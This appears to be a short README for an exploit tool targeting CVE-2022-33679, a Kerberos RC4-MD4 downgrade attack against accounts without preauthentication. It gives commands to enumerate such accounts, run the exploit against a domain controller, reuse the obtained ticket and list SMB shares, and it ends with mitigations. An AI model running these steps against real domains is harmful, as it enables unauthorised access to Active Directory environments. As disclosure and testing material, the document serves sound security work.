# Kerberos Encryption Downgrade CVE-2022-33679

### CVE-2022-33679 performs an encryption downgrade attack by forcing the KDC to use the RC4-MD4 algorithm and then brute forcing the session key from the AS-REP using a known plaintext attack, Similar to AS-REP Roasting, it works against accounts that have preauthentication disabled and the attack is unauthenticated meaning we don’t need a client’s password..

## Requirements

 - Accounts with the attribute DONT_REQ_PREAUTH AKA ASREP Roastable account ( PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose )

 - RC4-MD4 encryption algorithm enabled on the KDC

### Usage:

    python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL

    export KRB5CCNAME=/home/project/User.ccache

    crackmapexec smb DC01.DOMAIN.LOCAL -k --shares

## Mitigations

 - All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).

 - Disable RC4 cipher if possible.
